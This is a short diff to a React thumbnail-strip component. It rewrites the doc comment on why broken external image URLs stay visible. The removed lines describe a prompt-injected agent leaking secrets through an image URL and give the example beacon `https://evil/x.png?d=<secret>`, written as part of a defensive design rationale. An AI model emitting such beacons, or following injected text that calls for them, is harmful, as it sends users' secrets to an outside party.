@@ -65,9 +65,8 @@ export const ShownImagesContext = createContext<ShownImages | null>(null);
 const noSubscribe = () => () => {};
 
 /** Row of thumbnails. `agentProse`: refs scraped from an agent's text — hide our own
- *  dead ones, and skip any an image-job card in this thread is already showing. An
- *  external URL keeps its broken icon: hiding it would make an injected agent's
- *  `https://evil/x.png?d=<secret>` beacon invisible. */
+ *  dead ones (a deleted file), and skip any an image-job card in this thread is
+ *  already showing. A dead external URL stays visible as broken. */
 export function ImageStrip({ urls, agentProse = false }: { urls: string[]; agentProse?: boolean }) {
   const shown = useContext(ShownImagesContext);
   const store = agentProse ? shown : null;
